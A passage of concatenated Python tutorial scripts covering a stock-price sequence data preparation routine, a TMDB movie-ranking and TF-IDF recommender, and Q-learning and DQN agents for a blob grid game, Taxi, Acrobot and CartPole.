    last_sequence = shift(last_sequence, -1)
    # fill the last element
    last_sequence[-1] = last_feature_element

    # add last sequence to results
    result['last_sequence'] = last_sequence

    if buy_sell and balance:
        buys, sells = [], []
        for seq, target in seq_data:
            if target == 0:
                sells.append([seq, target])
            else:
                buys.append([seq, target])

        # balancing the dataset
        
        lower_length = min(len(buys), len(sells))

        buys = buys[:lower_length]
        sells = sells[:lower_length]

        seq_data = buys + sells

    if shuffle:
        unshuffled_seq_data = seq_data.copy()
        # shuffle data
        random.shuffle(seq_data)

    X, y = [], []
    for seq, target in seq_data:
        X.append(seq)
        y.append(target)

    X = np.array(X)
    y = np.array(y)

    if shuffle:
        unshuffled_X, unshuffled_y = [], []
        for seq, target in unshuffled_seq_data:
            unshuffled_X.append(seq)
            unshuffled_y.append(target)
        
        unshuffled_X = np.array(unshuffled_X)
        unshuffled_y = np.array(unshuffled_y)

        unshuffled_X = unshuffled_X.reshape((unshuffled_X.shape[0], unshuffled_X.shape[2], unshuffled_X.shape[1]))

    X = X.reshape((X.shape[0], X.shape[2], X.shape[1]))

    if not split:
        # return original_df, X, y, column_scaler, last_sequence
        result['X'] = X
        result['y'] = y
        return result
    else:
        # split dataset into training and testing
        n_samples = X.shape[0]
        train_samples = int(n_samples * (1 - test_size))
        result['X_train'] = X[:train_samples]
        result['X_test'] = X[train_samples:]
        result['y_train'] = y[:train_samples]
        result['y_test'] = y[train_samples:]
        if shuffle:
            result['unshuffled_X_test'] = unshuffled_X[train_samples:]
            result['unshuffled_y_test'] = unshuffled_y[train_samples:]
        return result

# from sentdex
def classify(current, future):
    if float(future) > float(current):  # if the future price is higher than the current, that's a buy, or a 1
        return 1
    else:  # otherwise... it's a 0!
        return 0


def shift(arr, num, fill_value=np.nan):
    result = np.empty_like(arr)
    if num > 0:
        result[:num] = fill_value
        result[num:] = arr[:-num]
    elif num < 0:
        result[num:] = fill_value
        result[:num] = arr[-num:]
    else:
        result = arr
    return result




import pandas as pd
import numpy as np
import matplotlib.pyplot as plt
import seaborn as sns
from sklearn.feature_extraction.text import TfidfVectorizer

movies_path = r"E:\datasets\recommender_systems\tmdb_5000_movies.csv"
credits_path = r"E:\datasets\recommender_systems\tmdb_5000_credits.csv"

credits = pd.read_csv(credits_path)
movies  = pd.read_csv(movies_path)

# rename movie_id to id to merge dataframes later
credits = credits.rename(index=str, columns={'movie_id': 'id'})

# join on movie id column
movies = movies.merge(credits, on="id")

# drop useless columns
movies = movies.drop(columns=['homepage', 'title_x', 'title_y', 'status', 'production_countries'])

# number of votes of the movie
V = movies['vote_count']
# rating average of the movie from 0 to 10
R = movies['vote_average']
# the mean vote across the whole report
C = movies['vote_average'].mean()
# minimum votes required to be listed in the top 250
m = movies['vote_count'].quantile(0.7)

movies['weighted_average'] = (V/(V+m) * R) + (m/(m+V) * C)

# ranked movies

wavg = movies.sort_values('weighted_average', ascending=False)

plt.figure(figsize=(16,6))

ax = sns.barplot(x=wavg['weighted_average'].head(10), y=wavg['original_title'].head(10), data=wavg, palette='deep')

plt.xlim(6.75, 8.35)
plt.title('"Best" Movies by TMDB Votes', weight='bold')
plt.xlabel('Weighted Average Score', weight='bold')
plt.ylabel('Movie Title', weight='bold')

plt.savefig('best_movies.png')

popular = movies.sort_values('popularity', ascending=False)

plt.figure(figsize=(16,6))

ax = sns.barplot(x=popular['popularity'].head(10), y=popular['original_title'].head(10), data=popular, palette='deep')

plt.title('"Most Popular" Movies by TMDB Votes', weight='bold')
plt.xlabel('Popularity Score', weight='bold')
plt.ylabel('Movie Title', weight='bold')

plt.savefig('popular_movies.png')

############ Content-Based ############
# filling NaNs with empty string
movies['overview'] = movies['overview'].fillna('')

tfv = TfidfVectorizer(min_df=3,  max_features=None, 
            strip_accents='unicode', analyzer='word',token_pattern=r'\w{1,}',
            ngram_range=(1, 3), use_idf=1,smooth_idf=1,sublinear_tf=1,
            stop_words = 'english')

tfv_matrix = tfv.fit_transform(movies['overview'])
print(tfv_matrix.shape)
print(tfv_matrix)




import numpy as np
from PIL import Image
import cv2 # showing the env
import matplotlib.pyplot as plt
import pickle
from matplotlib import style
import time
import os
from collections.abc import Iterable

style.use("ggplot")

GRID_SIZE = 10

# how many episodes 
EPISODES = 1_000
# how many steps in the env
STEPS = 200

# Rewards for differents events
MOVE_REWARD = -1
ENEMY_REWARD = -300
FOOD_REWARD = 30

epsilon = 0 # for randomness, it'll decay over time by EPSILON_DECAY
EPSILON_DECAY = 0.999993 # every episode, epsilon *= EPSILON_DECAY

SHOW_EVERY = 1

q_table = f"qtable-grid-{GRID_SIZE}-steps-{STEPS}.npy" # put here pretrained model ( if exists )

LEARNING_RATE = 0.1
DISCOUNT = 0.95

PLAYER_CODE = 1
FOOD_CODE = 2
ENEMY_CODE = 3

# blob dict, for colors
COLORS = {
    PLAYER_CODE: (255, 120, 0), # blueish color
    FOOD_CODE:   (0, 255, 0), # green
    ENEMY_CODE:  (0, 0, 255), # red
}


ACTIONS = {
    0: (0, 1),
    1: (-1, 0),
    2: (0, -1),
    3: (1, 0)
}

N_ENEMIES = 2

def get_observation(cords):
    obs = []
    for item1 in cords:
        for item2 in item1:
            obs.append(item2+GRID_SIZE-1)
    return tuple(obs)


class Blob:
    def __init__(self, name=None):
        self.x = np.random.randint(0, GRID_SIZE)
        self.y = np.random.randint(0, GRID_SIZE)
        self.name = name if name else "Blob"

    def __sub__(self, other):
        return (self.x - other.x, self.y - other.y)

    def __str__(self):
        return f"<{self.name.capitalize()} x={self.x}, y={self.y}>"

    def move(self, x=None, y=None):
        # if x is None, move randomly
        if x is None:
            self.x += np.random.randint(-1, 2)
        else:
            self.x += x
        
        # if y is None, move randomly
        if y is None:
            self.y += np.random.randint(-1, 2)
        else:
            self.y += y

        # out of bound fix
        if self.x < 0:
            # self.x = GRID_SIZE-1
            self.x = 0
        elif self.x > GRID_SIZE-1:
            # self.x = 0
            self.x = GRID_SIZE-1
        
        if self.y < 0:
            # self.y = GRID_SIZE-1
            self.y = 0
        elif self.y > GRID_SIZE-1:
            # self.y = 0
            self.y = GRID_SIZE-1

    def take_action(self, choice):
        # if choice == 0:
        #     self.move(x=1, y=1)
        # elif choice == 1:
        #     self.move(x=-1, y=-1)
        # elif choice == 2:
        #     self.move(x=-1, y=1)
        # elif choice == 3:
        #     self.move(x=1, y=-1)
        for code, (move_x, move_y) in ACTIONS.items():
            if choice == code:
                self.move(x=move_x, y=move_y)
        # if choice == 0:
        #     self.move(x=1, y=0)
        # elif choice == 1:
        #     self.move(x=0, y=1)
        # elif choice == 2:
        #     self.move(x=-1, y=0)
        # elif choice == 3:
        #     self.move(x=0, y=-1)

# construct the q_table if not already trained
if q_table is None or not os.path.isfile(q_table):
    # q_table = {}
    # # for every possible combination of the distance of the player
    # # to both the food and the enemy
    # for i in range(-GRID_SIZE+1, GRID_SIZE):
    #     for ii in range(-GRID_SIZE+1, GRID_SIZE):
    #         for iii in range(-GRID_SIZE+1, GRID_SIZE):
    #             for iiii in range(-GRID_SIZE+1, GRID_SIZE):
    #                 q_table[(i, ii), (iii, iiii)] = np.random.uniform(-5, 0, size=len(ACTIONS))
    q_table = np.random.uniform(-5, 0, size=[GRID_SIZE*2-1]*(2+2*N_ENEMIES) + [len(ACTIONS)])
else:
    # the q table already exists
    print("Loading Q-table")
    q_table = np.load(q_table)


# this list for tracking rewards
episode_rewards = []

# game loop
for episode in range(EPISODES):
    # initialize our blobs ( squares )
    player = Blob("Player")
    food   = Blob("Food")
    enemy1 = Blob("Enemy1")
    enemy2 = Blob("Enemy2")

    if episode % SHOW_EVERY == 0:
        print(f"[{episode:05}] ep: {epsilon:.4f} reward mean: {np.mean(episode_rewards[-SHOW_EVERY:])} alpha={LEARNING_RATE}")
        show = True
    else:
        show = False
    
    episode_reward = 0
    for i in range(STEPS):
        # get the observation
        obs = get_observation((player - food, player - enemy1, player - enemy2))
        # Epsilon-greedy policy
        if np.random.random() > epsilon:
            # get the action from the q table
            action = np.argmax(q_table[obs])
        else:
            # random action
            action = np.random.randint(0, len(ACTIONS))
        # take the action
        player.take_action(action)

        #### MAYBE ###
        #enemy.move()
        #food.move()
        ##############
        food.move()
        enemy1.move()
        enemy2.move()

        ### for rewarding
        if player.x == enemy1.x and player.y == enemy1.y:
            # if it hit the enemy, punish
            reward = ENEMY_REWARD
        elif player.x == enemy2.x and player.y == enemy2.y:
            # if it hit the enemy, punish
            reward = ENEMY_REWARD
        elif player.x == food.x and player.y == food.y:
            # if it hit the food, reward
            reward = FOOD_REWARD
        else:
            # else, punish it a little for moving
            reward = MOVE_REWARD

        ### calculate the Q
        # get the future observation after taking action
        future_obs = get_observation((player - food, player - enemy1, player - enemy2))
        # get the max future Q value (SarsaMax algorithm)
        # SARSA = State0, Action0, Reward0, State1, Action1
        max_future_q = np.max(q_table[future_obs])
        # get the current Q
        current_q = q_table[obs][action]
        # calculate the new Q
        if reward == FOOD_REWARD:
            new_q = FOOD_REWARD
        else:
            # value iteration update
            # https://en.wikipedia.org/wiki/Q-learning
            # Calculate the Temporal-Difference target
            td_target = reward + DISCOUNT * max_future_q
            # Temporal-Difference
            new_q = (1 - LEARNING_RATE) * current_q + LEARNING_RATE * td_target

        # update the q
        q_table[obs][action] = new_q


        if show:
            env = np.zeros((GRID_SIZE, GRID_SIZE, 3), dtype=np.uint8)
            # set food blob to green
            env[food.x][food.y] = COLORS[FOOD_CODE]
            # set the enemy blob to red
            env[enemy1.x][enemy1.y] = COLORS[ENEMY_CODE]
            env[enemy2.x][enemy2.y] = COLORS[ENEMY_CODE]
            # set the player blob to blueish
            env[player.x][player.y] = COLORS[PLAYER_CODE]
            # get the image
            image = Image.fromarray(env, 'RGB')
            image = image.resize((600, 600))
            # show the image
            cv2.imshow("image", np.array(image))
            if reward == FOOD_REWARD or reward == ENEMY_REWARD:
                if cv2.waitKey(500) == ord('q'):
                    break
            else:
                if cv2.waitKey(100) == ord('q'):
                    break
        
        episode_reward += reward
        if reward == FOOD_REWARD or reward == ENEMY_REWARD:
            break
        
    episode_rewards.append(episode_reward)
    # decay a little randomness in each episode
    epsilon *= EPSILON_DECAY
    


# with open(f"qtable-{int(time.time())}.pickle", "wb") as f:
#     pickle.dump(q_table, f)
np.save(f"qtable-grid-{GRID_SIZE}-steps-{STEPS}", q_table)

moving_avg = np.convolve(episode_rewards, np.ones((SHOW_EVERY,))/SHOW_EVERY, mode='valid')
plt.plot([i for i in range(len(moving_avg))], moving_avg)
plt.ylabel(f"Avg Reward every {SHOW_EVERY}")
plt.xlabel("Episode")
plt.show()




import numpy as np
import gym
import random
import matplotlib.pyplot as plt
import os
import time

env = gym.make("Taxi-v2").env

# init the Q-Table
# (500x6) matrix (n_states x n_actions)
q_table = np.zeros((env.observation_space.n, env.action_space.n))

# Hyper Parameters
# alpha
LEARNING_RATE = 0.1
# gamma
DISCOUNT_RATE = 0.9
EPSILON = 0.9
EPSILON_DECAY = 0.99993

EPISODES = 100_000
SHOW_EVERY = 1_000

# for plotting metrics
all_epochs = []
all_penalties = []
all_rewards = []

for i in range(EPISODES):
    
    # reset the env
    state = env.reset()

    epochs, penalties, rewards = 0, 0, []
    done = False

    while not done:
        if random.random() < EPSILON:
            # exploration
            action = env.action_space.sample()
        else:
            # exploitation
            action = np.argmax(q_table[state])

        next_state, reward, done, info = env.step(action)

        old_q = q_table[state, action]
        future_q = np.max(q_table[next_state])

        # calculate the new Q ( Q-Learning equation, i.e SARSAMAX )
        new_q = (1 - LEARNING_RATE) * old_q + LEARNING_RATE * ( reward + DISCOUNT_RATE * future_q)
        # update the new Q
        q_table[state, action] = new_q

        if reward == -10:
            penalties += 1
        
        state = next_state
        epochs += 1
        rewards.append(reward)

    

    if i % SHOW_EVERY == 0:
        print(f"[{i}] avg reward:{np.average(all_rewards):.4f} eps:{EPSILON:.4f}")
        # env.render()

    all_epochs.append(epochs)
    all_penalties.append(penalties)
    all_rewards.append(np.average(rewards))

    EPSILON *= EPSILON_DECAY

# env.render()
# plt.plot(list(range(len(all_rewards))), all_rewards)
# plt.show()

print("Playing in 5 seconds...")
time.sleep(5)
os.system("cls") if "nt" in os.name else os.system("clear")
# render

state = env.reset()
done = False
while not done:
    action = np.argmax(q_table[state])
    state, reward, done, info = env.step(action)
    env.render()
    time.sleep(0.2)
    os.system("cls") if "nt" in os.name else os.system("clear")
    
env.render()




import cv2
from PIL import Image

import os
# to use CPU uncomment below code
# os.environ["CUDA_DEVICE_ORDER"] = "PCI_BUS_ID"   # see issue #152
# os.environ["CUDA_VISIBLE_DEVICES"] = "-1"

# import tensorflow as tf

# config = tf.ConfigProto(intra_op_parallelism_threads=5,
#                         inter_op_parallelism_threads=5, 
#                         allow_soft_placement=True,
#                         device_count = {'CPU' : 1,
#                                         'GPU' : 0}
#                        )
import random
import gym
import numpy as np
import matplotlib.pyplot as plt
from collections import deque
from keras.models import Sequential
from keras.layers import Dense, Conv2D, MaxPooling2D, Dropout, Activation, Flatten
from keras.optimizers import Adam


EPISODES = 5_000
REPLAY_MEMORY_MAX = 20_000
MIN_REPLAY_MEMORY = 1_000

SHOW_EVERY = 50
RENDER_EVERY = 100
LEARN_EVERY = 50

GRID_SIZE = 20
ACTION_SIZE = 9


class Blob:
    def __init__(self, size):
        self.size = size
        self.x = np.random.randint(0, size)
        self.y = np.random.randint(0, size)

    def __str__(self):
        return f"Blob ({self.x}, {self.y})"

    def __sub__(self, other):
        return (self.x-other.x, self.y-other.y)

    def __eq__(self, other):
        return self.x == other.x and self.y == other.y

    def action(self, choice):
        '''
        Gives us 9 total movement options. (0,1,2,3,4,5,6,7,8)
        '''
        if choice == 0:
            self.move(x=1, y=1)
        elif choice == 1:
            self.move(x=-1, y=-1)
        elif choice == 2:
            self.move(x=-1, y=1)
        elif choice == 3:
            self.move(x=1, y=-1)

        elif choice == 4:
            self.move(x=1, y=0)
        elif choice == 5:
            self.move(x=-1, y=0)

        elif choice == 6:
            self.move(x=0, y=1)
        elif choice == 7:
            self.move(x=0, y=-1)

        elif choice == 8:
            self.move(x=0, y=0)

    def move(self, x=False, y=False):

        # If no value for x, move randomly
        if not x:
            self.x += np.random.randint(-1, 2)
        else:
            self.x += x

        # If no value for y, move randomly
        if not y:
            self.y += np.random.randint(-1, 2)
        else:
            self.y += y

        # If we are out of bounds, fix!
        if self.x < 0:
            self.x = 0
        elif self.x > self.size-1:
            self.x = self.size-1
        if self.y < 0:
            self.y = 0
        elif self.y > self.size-1:
            self.y = self.size-1


class BlobEnv:
    RETURN_IMAGES = True
    MOVE_PENALTY = 1
    ENEMY_PENALTY = 300
    FOOD_REWARD = 25
    
    ACTION_SPACE_SIZE = 9
    PLAYER_N = 1  # player key in dict
    FOOD_N = 2  # food key in dict
    ENEMY_N = 3  # enemy key in dict
    # the dict! (colors)
    d = {1: (255, 175, 0),
         2: (0, 255, 0),
         3: (0, 0, 255)}

    def __init__(self, size):
        self.SIZE = size
        self.OBSERVATION_SPACE_VALUES = (self.SIZE, self.SIZE, 3)  # 4

    def reset(self):
        self.player = Blob(self.SIZE)
        self.food = Blob(self.SIZE)
        while self.food == self.player:
            self.food = Blob(self.SIZE)
        self.enemy = Blob(self.SIZE)
        while self.enemy == self.player or self.enemy == self.food:
            self.enemy = Blob(self.SIZE)

        self.episode_step = 0

        if self.RETURN_IMAGES:
            observation = np.array(self.get_image())
        else:
            observation = (self.player-self.food) + (self.player-self.enemy)
        return observation

    def step(self, action):
        self.episode_step += 1
        self.player.action(action)

        #### MAYBE ###
        #enemy.move()
        #food.move()
        ##############

        if self.RETURN_IMAGES:
            new_observation = np.array(self.get_image())
        else:
            new_observation = (self.player-self.food) + (self.player-self.enemy)

        if self.player == self.enemy:
            reward = -self.ENEMY_PENALTY
            done = True
        elif self.player == self.food:
            reward = self.FOOD_REWARD
            done = True
        else:
            reward = -self.MOVE_PENALTY
            if self.episode_step < 200:
                done = False
            else:
                done = True

        return new_observation, reward, done

    def render(self):
        img = self.get_image()
        img = img.resize((300, 300))  # resizing so we can see our agent in all its glory.
        cv2.imshow("image", np.array(img))  # show it!
        cv2.waitKey(1)

    # FOR CNN #
    def get_image(self):
        env = np.zeros((self.SIZE, self.SIZE, 3), dtype=np.uint8)  # starts an rbg of our size
        env[self.food.x][self.food.y] = self.d[self.FOOD_N]  # sets the food location tile to green color
        env[self.enemy.x][self.enemy.y] = self.d[self.ENEMY_N]  # sets the enemy location to red
        env[self.player.x][self.player.y] = self.d[self.PLAYER_N]  # sets the player tile to blue
        img = Image.fromarray(env, 'RGB')  # reading to rgb. Apparently. Even tho color definitions are bgr. ???
        return img


class DQNAgent:
    def __init__(self, state_size, action_size):
        self.state_size = state_size
        self.action_size = action_size
        self.memory = deque(maxlen=REPLAY_MEMORY_MAX)
        # discount rate
        self.gamma = 0.95
        # exploration rate
        self.epsilon = 1.0
        self.epsilon_min = 0.01
        self.epsilon_decay = 0.9997
        self.learning_rate = 0.001
        # models to be built
        # Dual
        self.model = self.build_model()
        self.target_model = self.build_model()
        self.update_target_model()

    def build_model(self):
        """Builds the DQN Model"""
        # Neural network for Deep-Q Learning Model
        model = Sequential()
        model.add(Conv2D(256, (3, 3), input_shape=self.state_size))
        model.add(Activation("relu"))
        model.add(MaxPooling2D(pool_size=(2, 2)))
        model.add(Dropout(0.2))

        model.add(Conv2D(256, (3, 3)))
        model.add(Activation("relu"))
        model.add(MaxPooling2D(pool_size=(2, 2)))
        model.add(Dropout(0.2))

        model.add(Flatten())  # this converts our 3D feature maps to 1D feature vectors
        model.add(Dense(32))
        # output layer
        model.add(Dense(self.action_size, activation="linear"))
        model.compile(loss="mse", optimizer=Adam(lr=self.learning_rate))
        return model

    def update_target_model(self):
        """Copy weights from self.model to self.target_model"""
        self.target_model.set_weights(self.model.get_weights())
    
    def remember(self, state, action, reward, next_state, done):
        """Adds a sample to the memory"""
        # for images, expand dimension, comment if you are not using images as states
        state = state / 255
        next_state = next_state / 255
        state = np.expand_dims(state, axis=0)
        next_state = np.expand_dims(next_state, axis=0)
        self.memory.append((state, action, reward, next_state, done))

    def act(self, state):
        """Takes action using Epsilon-Greedy Policy"""
        if np.random.random() <= self.epsilon:
            return random.randint(0, self.action_size-1)
        else:
            state = state / 255
            state = np.expand_dims(state, axis=0)
            act_values = self.model.predict(state)
            # print("act_values:", act_values.shape)
            return np.argmax(act_values[0])

    def replay(self, batch_size):
        """Train on a replay memory with a batch_size of samples"""
        if len(self.memory) < MIN_REPLAY_MEMORY:
            return
        minibatch = random.sample(self.memory, batch_size)
        for state, action, reward, next_state, done in minibatch:
            target = reward
            if not done:
                target = ( reward + self.gamma * np.max(self.target_model.predict(next_state)[0]) )
            target_f = self.model.predict(state)
            target_f[0][action] = target
            self.model.fit(state, target_f, epochs=1, verbose=0, batch_size=1)
        # decay epsilon if possible
        self.epsilon = max(self.epsilon * self.epsilon_decay, self.epsilon_min)

    def load(self, name):
        self.model.load_weights(name)
        self.target_model.load_weights(name)

    def save(self, name):
        self.model.save_weights(name)
        self.target_model.save_weights(name)


if __name__ == "__main__":
    batch_size = 64
    env = BlobEnv(GRID_SIZE)
    agent = DQNAgent(env.OBSERVATION_SPACE_VALUES, ACTION_SIZE)
    ep_rewards = deque([-200], maxlen=SHOW_EVERY)
    avg_rewards = []
    min_rewards = []
    max_rewards = []
    for episode in range(1, EPISODES+1):
        # restarting episode => reset episode reward and step number
        episode_reward = 0
        step = 1

        # reset env and get init state
        current_state = env.reset()

        done = False
        while True:
            # take action 
            action = agent.act(current_state)
            next_state, reward, done = env.step(action)

            episode_reward += reward

            if episode % RENDER_EVERY == 0:
                env.render()
            
            # add transition to agent's memory
            agent.remember(current_state, action, reward, next_state, done)
            if step % LEARN_EVERY == 0:
                agent.replay(batch_size=batch_size)
            current_state = next_state
            step += 1

            if done:
                agent.update_target_model()
                break
        
        ep_rewards.append(episode_reward)
        avg_reward = np.mean(ep_rewards)
        min_reward = min(ep_rewards)
        max_reward = max(ep_rewards)
        
        avg_rewards.append(avg_reward)
        min_rewards.append(min_reward)
        max_rewards.append(max_reward)
        print(f"[{episode}] avg:{avg_reward:.2f} min:{min_reward} max:{max_reward} eps:{agent.epsilon:.4f}")
        # if episode % SHOW_EVERY == 0:
            # print(f"[{episode}] avg: {avg_reward} min: {min_reward} max: {max_reward} eps: {agent.epsilon:.4f}")
    
    episodes = list(range(EPISODES))
    plt.plot(episodes, avg_rewards, c='b')
    plt.plot(episodes, min_rewards, c='r')
    plt.plot(episodes, max_rewards, c='g')
    plt.show()
    agent.save("blob_v1.h5")




import os
# to use CPU uncomment below code
os.environ["CUDA_DEVICE_ORDER"] = "PCI_BUS_ID"   # see issue #152
os.environ["CUDA_VISIBLE_DEVICES"] = "-1"

import tensorflow as tf

config = tf.ConfigProto(intra_op_parallelism_threads=5,
                        inter_op_parallelism_threads=5, 
                        allow_soft_placement=True,
                        device_count = {'CPU' : 1,
                                        'GPU' : 0}
                       )
import random
import gym
import numpy as np
import matplotlib.pyplot as plt
from collections import deque
from keras.models import Sequential
from keras.layers import Dense
from keras.optimizers import Adam


EPISODES = 5_000
REPLAY_MEMORY_MAX = 2_000

SHOW_EVERY = 500
RENDER_EVERY = 1_000

class DQNAgent:
    def __init__(self, state_size, action_size):
        self.state_size = state_size
        self.action_size = action_size
        self.memory = deque(maxlen=REPLAY_MEMORY_MAX)
        # discount rate
        self.gamma = 0.95
        # exploration rate
        self.epsilon = 1.0
        self.epsilon_min = 0.01
        self.epsilon_decay = 0.9997
        self.learning_rate = 0.001
        # models to be built
        # Dual
        self.model = self.build_model()
        self.target_model = self.build_model()
        self.update_target_model()

    def build_model(self):
        """Builds the DQN Model"""
        # Neural network for Deep-Q Learning Model
        model = Sequential()
        model.add(Dense(32, input_dim=self.state_size, activation="relu"))
        model.add(Dense(32, activation="relu"))
        # output layer
        model.add(Dense(self.action_size, activation="linear"))
        model.compile(loss="mse", optimizer=Adam(lr=self.learning_rate))
        return model

    def update_target_model(self):
        """Copy weights from self.model to self.target_model"""
        self.target_model.set_weights(self.model.get_weights())
    
    def remember(self, state, action, reward, next_state, done):
        """Adds a sample to the memory"""
        self.memory.append((state, action, reward, next_state, done))

    def act(self, state):
        """Takes action using Epsilon-Greedy Policy"""
        if np.random.random() <= self.epsilon:
            return random.randint(0, self.action_size-1)
        else:
            act_values = self.model.predict(state)
            # print("act_values:", act_values.shape)
            return np.argmax(act_values[0])

    def replay(self, batch_size):
        """Train on a replay memory with a batch_size of samples"""
        minibatch = random.sample(self.memory, batch_size)
        for state, action, reward, next_state, done in minibatch:
            target = reward
            if not done:
                target = ( reward + self.gamma * np.max(self.target_model.predict(next_state)[0]) )
            target_f = self.model.predict(state)
            target_f[0][action] = target
            self.model.fit(state, target_f, epochs=1, verbose=0)
        # decay epsilon if possible
        self.epsilon = max(self.epsilon * self.epsilon_decay, self.epsilon_min)

    def load(self, name):
        self.model.load_weights(name)
        self.target_model.load_weights(name)

    def save(self, name):
        self.model.save_weights(name)
        self.target_model.save_weights(name)

    
if __name__ == "__main__":
    env = gym.make("Acrobot-v1")
    state_size = env.observation_space.shape[0]
    action_size = env.action_space.n
    agent = DQNAgent(state_size=state_size, action_size=action_size)
    # agent.load("AcroBot_v1.h5")
    done = False
    batch_size = 32

    all_rewards = deque(maxlen=SHOW_EVERY)
    avg_rewards = []
    
    for e in range(EPISODES):
        state = env.reset()
        state = np.reshape(state, (1, state_size))
        rewards = 0
        while True:
            action = agent.act(state)
            # print(action)
            next_state, reward, done, info = env.step(action)
            # punish if not yet finished
            # reward = reward if not done else 10
            next_state = np.reshape(next_state, (1, state_size))
            agent.remember(state, action, reward, next_state, done)
            state = next_state
            if done:
                agent.update_target_model()
                break
            if e % RENDER_EVERY == 0:
                env.render()
            rewards += reward
            # print(rewards)
        all_rewards.append(rewards)
        avg_reward = np.mean(all_rewards)
        avg_rewards.append(avg_reward)
        if e % SHOW_EVERY == 0:
            print(f"[{e:4}] avg reward:{avg_reward:.3f} eps: {agent.epsilon:.2f}")
        if len(agent.memory) > batch_size:
            agent.replay(batch_size)
            
    agent.save("AcroBot_v1.h5")
    plt.plot(list(range(EPISODES)), avg_rewards)
    plt.show()




import os
# to use CPU uncomment below code
os.environ["CUDA_DEVICE_ORDER"] = "PCI_BUS_ID"   # see issue #152
os.environ["CUDA_VISIBLE_DEVICES"] = "-1"

import tensorflow as tf

config = tf.ConfigProto(intra_op_parallelism_threads=5,
                        inter_op_parallelism_threads=5, 
                        allow_soft_placement=True,
                        device_count = {'CPU' : 1,
                                        'GPU' : 0}
                       )
import random
import gym
import numpy as np
import matplotlib.pyplot as plt
from collections import deque
from keras.models import Sequential
from keras.layers import Dense
from keras.optimizers import Adam


EPISODES = 1000
REPLAY_MEMORY_MAX = 5000

SHOW_EVERY = 100

class DQNAgent:
    def __init__(self, state_size, action_size):
        self.state_size = state_size
        self.action_size = action_size
        self.memory = deque(maxlen=REPLAY_MEMORY_MAX)
        # discount rate
        self.gamma = 0.95
        # exploration rate
        self.epsilon = 1.0
        self.epsilon_min = 0.01
        self.epsilon_decay = 0.995
        self.learning_rate = 0.001
        # model to be built
        self.model = None
        self.build_model()

    def build_model(self):
        """Builds the DQN Model"""
        # Neural network for Deep-Q Learning Model
        model = Sequential()
        model.add(Dense(24, input_dim=self.state_size, activation="relu"))
        model.add(Dense(24, activation="relu"))
        # output layer
        model.add(Dense(self.action_size, activation="linear"))
        model.compile(loss="mse", optimizer=Adam(lr=self.learning_rate))
        self.model = model

    def remember(self, state, action, reward, next_state, done):
        """Adds a sample to the memory"""
        self.memory.append((state, action, reward, next_state, done))

    def act(self, state):
        """Takes action using Epsilon-Greedy Policy"""
        if np.random.random() <= self.epsilon:
            return random.randint(0, self.action_size-1)
        else:
            act_values = self.model.predict(state)
            # print("act_values:", act_values.shape)
            return np.argmax(act_values[0])

    def replay(self, batch_size):
        """Train on a replay memory with a batch_size of samples"""
        minibatch = random.sample(self.memory, batch_size)
        for state, action, reward, next_state, done in minibatch:
            target = reward
            if not done:
                target = ( reward + self.gamma * np.max(self.model.predict(next_state)[0]) )
            target_f = self.model.predict(state)
            target_f[0][action] = target
            self.model.fit(state, target_f, epochs=1, verbose=0)
        # decay epsilon if possible
        self.epsilon = max(self.epsilon * self.epsilon_decay, self.epsilon_min)

    def load(self, name):
        self.model.load_weights(name)

    def save(self, name):
        self.model.save_weights(name)

    
if __name__ == "__main__":
    env = gym.make("CartPole-v1")
    state_size = env.observation_space.shape[0]
    action_size = env.action_space.n
    agent = DQNAgent(state_size=state_size, action_size=action_size)

    done = False
    batch_size = 32

    scores = []
    avg_scores = []
    avg_score = 0
    for e in range(EPISODES):
        state = env.reset()
        state = np.reshape(state, (1, state_size))
        
        for t in range(500):
            action = agent.act(state)
            # print(action)
            next_state, reward, done, info = env.step(action)
            # punish if not yet finished
            reward = reward if not done else -10
            next_state = np.reshape(next_state, (1, state_size))
            agent.remember(state, action, reward, next_state, done)
            state = next_state
            if done:
                print(f"[{e:4}] avg score:{avg_score:.3f} eps: {agent.epsilon:.2f}")
                break
            if e % SHOW_EVERY == 0:
                env.render()
        if len(agent.memory) > batch_size:
            agent.replay(batch_size)
        scores.append(t)
        
        avg_score = np.average(scores)
        avg_scores.append(avg_score)
            
    agent.save("v1.h5")
    plt.plot(list(range(EPISODES)), avg_scores)
    plt.show()




import numpy as np
import keras.backend.tensorflow_backend as backend
from keras.models import Sequential
from keras.layers import Dense, Dropout, Conv2D, MaxPooling2D, Activation, Flatten, LSTM
from keras.optimizers import Adam
from keras.callbacks import TensorBoard
import tensorflow as tf
from collections import deque
import time
import random
from tqdm import tqdm
import os
from PIL import Image
import cv2
import itertools


DISCOUNT = 0.96
REPLAY_MEMORY_SIZE = 50_000  # How many last steps to keep for model training
MIN_REPLAY_MEMORY_SIZE = 1_000  # Minimum number of steps in a memory to start training
MINIBATCH_SIZE = 32  # How many steps (samples) to use for training
UPDATE_TARGET_EVERY = 5  # Terminal states (end of episodes)
MODEL_NAME = '3x128-LSTM-7enemies-'
MIN_REWARD = -200  # For model save
MEMORY_FRACTION = 0.20

# Environment settings
EPISODES = 50_000

# Exploration settings
epsilon = 1.0  # not a constant, going to be decayed
EPSILON_DECAY = 0.999771
MIN_EPSILON = 0.01

#  Stats settings
AGGREGATE_STATS_EVERY = 100  # episodes
SHOW_PREVIEW = False


class Blob:
    def __init__(self, size):
        self.size = size
        self.x = np.random.randint(0, size)
        self.y = np.random.randint(0, size)

    def __str__(self):
        return f"Blob ({self.x}, {self.y})"

    def __sub__(self, other):
        return (self.x-other.x, self.y-other.y)

    def __eq__(self, other):
        return self.x == other.x and self.y == other.y

    def action(self, choice):
        '''
        Gives us 9 total movement options. (0,1,2,3,4,5,6,7,8)
        '''
        if choice == 0:
            self.move(x=1, y=0)
        elif choice == 1:
            self.move(x=-1, y=0)
        elif choice == 2:
            self.move(x=0, y=1)
        elif choice == 3:
            self.move(x=0, y=-1)


    def move(self, x=False, y=False):

        # If no value for x, move randomly
        if x is False:
            self.x += np.random.randint(-1, 2)
        else:
            self.x += x

        # If no value for y, move randomly
        if y is False:
            self.y += np.random.randint(-1, 2)
        else:
            self.y += y

        # If we are out of bounds, fix!
        if self.x < 0:
            self.x = 0
        elif self.x > self.size-1:
            self.x = self.size-1
        if self.y < 0:
            self.y = 0
        elif self.y > self.size-1:
            self.y = self.size-1


class BlobEnv:
    SIZE = 20
    RETURN_IMAGES = False
    MOVE_PENALTY = 1
    ENEMY_PENALTY = 300
    FOOD_REWARD = 25
    # if RETURN_IMAGES:
    #     OBSERVATION_SPACE_VALUES = (SIZE, SIZE, 3)  # 4
    # else:
    #     OBSERVATION_SPACE_VALUES = (4,)
    ACTION_SPACE_SIZE = 4
